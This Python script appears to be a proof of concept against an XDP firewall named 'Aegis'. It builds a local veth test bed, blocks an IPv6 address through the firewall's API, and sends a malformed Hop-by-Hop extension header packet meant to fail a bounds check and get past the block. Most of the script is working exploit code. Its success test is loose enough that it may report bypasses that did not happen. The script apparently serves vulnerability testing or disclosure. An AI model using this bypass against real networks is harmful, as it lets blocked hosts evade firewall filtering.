#!/usr/bin/env python3
import time
import subprocess
from scapy.all import *
import threading

def run_tcpdump():
    # Capture packets on veth2 to see if it makes it through veth1 (where Aegis is)
    print("[*] Starting tcpdump on veth2...")
    cmd = ["tcpdump", "-i", "veth2", "-n", "-c", "2", "udp"]
    try:
        output = subprocess.check_output(cmd, timeout=10, stderr=subprocess.STDOUT).decode()
        print("[+] Captured output from tcpdump:\n" + output)
        if "2001:db8::1" in output and "2001:db8::2" in output:
            if "bad ext header" in output or "truncated" in output or "length" in output or "2048" in output or "UDP" in output:
                print("[!] VULNERABILITY CONFIRMED: Packet bypassed XDP firewall and reached veth2!")
        else:
            print("[-] Packet did not reach veth2.")
    except subprocess.TimeoutExpired:
        print("[-] Tcpdump timed out. No packets reached veth2 (Firewall successfully blocked them).")

# 1. Setup interfaces
print("[*] Setting up veth interfaces...")
subprocess.run("ip link add dev veth1 type veth peer name veth2", shell=True, stderr=subprocess.DEVNULL)
subprocess.run("ip link set veth1 up", shell=True)
subprocess.run("ip link set veth2 up", shell=True)
subprocess.run("ip -6 addr add 2001:db8::2/64 dev veth2", shell=True)
subprocess.run("ip -6 addr add 2001:db8::1/64 dev veth1", shell=True)

# 2. Start Aegis on veth1
print("[*] Starting Aegis firewall on veth1...")
aegis_proc = subprocess.Popen(
    ["target/debug/aegis-cli", "-i", "veth1"],
    stdout=subprocess.PIPE, stderr=subprocess.PIPE
)
time.sleep(3) # Wait for BPF to load

# 3. Add attacker IP to blocklist via API
print("[*] Blocking attacker IP (2001:db8::1)...")
subprocess.run([
    "curl", "-s", "-X", "POST", "http://127.0.0.1:9100/api/block",
    "-H", "Content-Type: application/json",
    "-d", '{"ip": "2001:db8::1"}'
])

# 4. Start tcpdump in a thread
t = threading.Thread(target=run_tcpdump)
t.start()
time.sleep(1)

print("[*] Sending NORMAL UDP packet from blocked IP...")
# Should be blocked
pkt1 = IPv6(src="2001:db8::1", dst="2001:db8::2") / UDP(sport=1337, dport=1337) / b"NORMAL_TEST"
send(pkt1, iface="veth1", verbose=False)
time.sleep(1)

print("[*] Sending MALFORMED EXTENSION HEADER UDP packet from blocked IP...")
# Hop-by-Hop header with ext_len=255. 
# This will cause ptr_at to fail bounds check in try_xdp_ipv6 -> returns Err(()) -> xdp_firewall passes it!
pkt2 = IPv6(src="2001:db8::1", dst="2001:db8::2") / IPv6ExtHdrHopByHop(nh=17, len=255) / UDP(sport=1337, dport=1337) / b"BYPASS_TEST"
send(pkt2, iface="veth1", verbose=False)

t.join()

# Cleanup
print("[*] Cleaning up...")
aegis_proc.terminate()
subprocess.run("ip link del dev veth1", shell=True, stderr=subprocess.DEVNULL)
